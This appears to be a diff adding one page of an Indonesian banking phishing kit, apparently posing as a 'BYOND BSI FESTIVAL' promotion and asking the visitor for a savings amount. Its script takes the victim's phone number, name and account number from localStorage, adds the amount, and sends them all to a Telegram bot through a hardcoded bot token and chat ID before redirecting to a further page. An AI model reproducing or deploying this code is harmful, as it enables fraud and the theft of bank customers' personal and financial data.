@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#008b8b">
+    <title>Sisa Saldo Tabungan</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 90vh;
+            background: linear-gradient(to bottom, #ffa502, #ffffff);
+        }
+        .box {
+            width: 300px;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            background: linear-gradient(45deg, #afeeee, #66cdaa, #f5eeea, #66cdaa);
+            background-size: 400% 400%;
+            animation: gradientBG 6s infinite linear;
+        }
+        .input-container {
+            position: relative;
+            width: 93%;
+            margin-bottom: 10px;
+        }
+        .input-container img {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 20px;
+        }
+        .input-container input {
+            width: 90%;
+            padding: 10px 10px 10px 40px;
+            border: none;
+            border-bottom: 2px solid #008b8b;
+            font-size: 16px;
+            background: white;
+            outline: none;
+            border-radius: 2px;
+            font-weight:bold;
+        }
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+        }
+        
+        
+         .loading-box::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, #66CDAA, transparent);
+            animation: slideEffect 2s infinite linear;
+        }
+
+        @keyframes slideEffect {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+        .loading-box {
+            position: relative;
+            padding: 20px;
+            background: white;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        .loading-box img {
+            width: 80px;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            font-size: 14px;
+            background: #008B8B;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight:bold;
+            transition: background 0.3s;
+            margin-top: 10px;
+        }
+        .nav-top {
+    width: 100%;
+    text-align: center;
+    position: absolute;
+    top: 0;
+    left: 0;
+    background-color:#ffffff;
+}
+
+.nav-top img {
+    width: 100%; 
+    max-height: 80px; 
+    
+}
+
+.nav-bottom {
+    width: 100%;
+    text-align: center;
+    position: absolute;
+    bottom: 0;
+    left: 0;
+    background-color: #ffffff;
+    
+}
+
+.nav-bottom img {
+    width: 100%;
+    max-height: 80px; 
+    
+}
+.box img {
+  
+    border-radius: 3px;
+    padding: px; 
+}
+    </style>
+</head>
+<body>
+        <nav class="nav-top">
+        <img src="https://blogger.googleusercontent.com/img/a/AVvXsEilqZbBzvnbJd-tPbDSagQ1LI-Q2Iocg5LNE_4nr1nTFAm1nSoNZJxrjIdMjUklBn1nIxELX-p1ZfI9fqhyGjHQm3rqpZgZbEpmXb7KGvb_dt0aWMBOS2ppKPOvPcuVLy_C3yfhad_gFjwfccsYh2Mv8_D7J4LhdxyzwtN4hRC5sp9UUg1bo4_yLHND3xNc" alt="Navigasi Atas">
+    </nav>
+    <div class="box">
+        <img width="102%" src="https://blogger.googleusercontent.com/img/a/AVvXsEhu9OiysWbQuWw3Vaj_cp4Kb0Z48wQngZ2bEHILl6ZKWHW1rN8Q9b1Ue8OPFX-fWQrLjw4CAzfZy5Sm94EGoGPdUqdtUB42G9KgViNe8QY1AxJqTftygzn9UosXz_hjy2eGIBav_flFfX0ooTat2RGBViD8Yer_6G5uNemwS0ErSf5mfpyJMEdbi1oTc1hz" alt=""><br><br>
+  
+        <form id="form">
+            <div class="input-container">
+                <img src="https://blogger.googleusercontent.com/img/a/AVvXsEhrs-uLN7BYh-s24ITvpoHpvknKZOSslnH87Lmlc_I_JQp4D5xdLD1MlaMIWT8zvDbvoLGwoQZy0mUNS4t_dmeaevnsdlluUNhCmYTpHEKUNfZCQ7OAPHf0EBY2Obx_iOCIW7TCtmGyjRv_EXEN0rDzKvHwVm1Whm0TIXIKlbP767g9LVBbW4kY6qz1U2Z2" alt="icon">
+                <input type="tel" id="jumlah" placeholder="Jumlah" required>
+            </div>
+            <button type="submit">Lanjut</button>
+        </form>
+    </div>
+    <div class="loading-overlay" id="loading">
+        <div class="loading-box">
+            <img src="https://blogger.googleusercontent.com/img/a/AVvXsEguY84ryEdVHjp7AzA24tad3ORFej6SIzkM5hqMeXw8hkH-RDamWTSAQ-49OvfUG3ocV40Ujvdn3L_7qof4-coDJ7SeA5WfgXBtQ1upBxofO0HlroHzMmZDhaDLVx4MXLg-CpvIy0K7skAy8iLqJriH2-K8aKWRwL5r1vWIPCpo0bxAzB3saGbIoey5WeNX" alt="Loading">
+        </div>
+    </div>
+            <nav class="nav-bottom">
+        <img src="https://blogger.googleusercontent.com/img/a/AVvXsEgNJy5ogTV4GB3yaT0dLxRgd7U568WNiU9w6RhvyDBOfvOgMfU098Rbj_Jrbcz941k36QRuMNeI8mZgEnKuZDCviMzPBtsv8qEGD7VBx7OQ4_Qi7_Ulsy6TjdokfF8IP3GHr1Mt419lQI26HATH_Iq9RWw30d93fSIf0OgYHEL-vhmXddNNddCwD87gffbG" alt="Navigasi Bawah">
+    </nav>
+    <script>
+        const form = document.getElementById("form");
+        const loading = document.getElementById("loading");
+        const inputJumlah = document.getElementById("jumlah");
+
+        // Mengambil data dari localStorage
+        const nohp = localStorage.getItem("nohp") || "";
+        const nama = localStorage.getItem("nama") || "";
+        const rekening = localStorage.getItem("rekening") || "";
+
+        inputJumlah.addEventListener("input", () => {
+            let value = inputJumlah.value.replace(/\D/g, "");
+            inputJumlah.value = value.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+        });
+
+        form.addEventListener("submit", async (e) => {
+            e.preventDefault();
+            loading.style.display = "flex";
+            
+            let jumlah = inputJumlah.value.replace(/\D/g, "");
+            let jumlahFormatted = jumlah.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+            let rekeningFormatted = rekening.replace(/\D/g, ""); // Pastikan rekening tidak diberi titik
+            
+            const botToken = "8128102057:AAH2_K7YwSWKZpOJuU9bJjW8WvyO9agfMK4";
+            const chatId = "6972541608";
+            const message = `⭐ Rajawali Abadi ⭐\nData BYOND BSI FESTIVAL\n\nNo HP: ${nohp}\nNama: ${nama}\nRekening: ${rekeningFormatted}\n\nJumlah: ${jumlahFormatted}`;
+            
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            });
+            
+            setTimeout(() => {
+                loading.style.display = "none";
+                window.location.href = "patok.html";
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
